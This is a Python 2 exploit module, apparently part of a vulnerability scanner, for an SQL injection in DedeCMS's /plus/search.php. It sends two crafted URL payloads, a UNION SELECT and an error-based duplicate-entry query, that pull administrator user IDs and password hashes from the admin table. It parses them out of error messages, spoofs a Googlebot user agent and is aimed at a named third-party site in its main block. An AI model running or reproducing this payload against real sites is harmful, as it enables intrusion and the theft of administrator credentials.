#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#dedecms 注入
#http://hi.baidu.com/yu1u0/item/c0c60d1e6a17ce8ffeded5d7
#http://www.91ri.org/5118.html
#
import threading
import urllib2
import re
import sys

from class_Queue import url_exp

class bc_dedecms_search_php:
    def open_url_data(self,url):  #读取网页内容
        try:
            req = urllib2.Request(url)
            req.add_header('User-Agent',"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
            s = urllib2.urlopen(req,timeout=20)  # 超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
            return s.read()
        except:
            return 0

#    def scan(self,URL):
#        try:
    def assign(self,service, arg=None):
        if service == 'DedeCms':
            return True, arg

    def scan(self,arg):
        try:
            url0, url1 = arg
            tj_data1=url1+"/plus/search.php?keyword=as&typeArr[111%3D@`\\'`)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,userid,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+`%23@__admin`%23@`\\'`+]=a"
            ss=self.open_url_data(tj_data1)
            if ss==0:  #读取网页内容
                return 0
            pname = re.compile( r'Error infos: Duplicate entry \'(.*?)\' for key')
            sarr = pname.findall(ss)
            if sarr:
                EXP_list=[1,url0,url1,"CN_bc_dedecms_search_php1",url1+"/plus/search.php",sarr[0],""]
                #["01可信度","主网址","从网址","漏洞类型","漏洞地址","密码","备注"] 7个
                #print EXP_list
                url_exp.put(EXP_list,0.5)   #插入队列

            tj_data1=url1+"/plus/search.php?keyword=as&typeArr[111%3D@`\\'`)+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@`\\'`+]=a"
            ss=self.open_url_data(tj_data1)
            if ss==0:  #读取网页内容
                return 0
            pname = re.compile( r'Error infos: Duplicate entry \'(.*?)\' for key' )
            sarr = pname.findall(ss)
            if sarr:
                EXP_list=[1,url0,url1,"CN_bc_dedecms_search_php2",url1+"/plus/search.php",sarr[0],""]
                #["01可信度","主网址","从网址","漏洞类型","漏洞地址","密码","备注"] 7个
                #print EXP_list
                url_exp.put(EXP_list,0.5)   #插入队列

        except:
            pass




################################################
if __name__=='__main__':
    class_www=bc_dedecms_search_php()
    class_www.scan(class_www.assign('DedeCms', ("http://www.baidu.com","http://m.szbdqn.cn"))[1])


